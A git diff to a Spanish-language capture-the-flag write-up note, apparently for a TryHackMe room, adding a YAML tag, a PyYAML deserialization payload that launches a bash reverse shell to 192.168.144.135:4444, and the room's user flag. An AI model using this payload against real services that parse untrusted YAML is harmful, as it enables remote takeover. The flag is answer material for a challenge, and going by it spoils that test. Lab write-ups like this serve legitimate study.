@@ -5,7 +5,7 @@ platform: ""
 difficulty: ""
 os: ""
 tags:
-  - 
+  - YAML
 status: ""
 ---
 
@@ -50,12 +50,12 @@ status: ""
 
 ### Ejecución
 ```bash
-
+!!python/object/apply:subprocess.check_output [["bash","-c","bash -i >& /dev/tcp/192.168.144.135/4444 0>&1"]]
 ```
 
 **Prueba de acceso (User Flag):**
 ```bash
-
+THM{y4ml_pl4yl1st_pwns_th3_b34ch
 ```
 
 ---
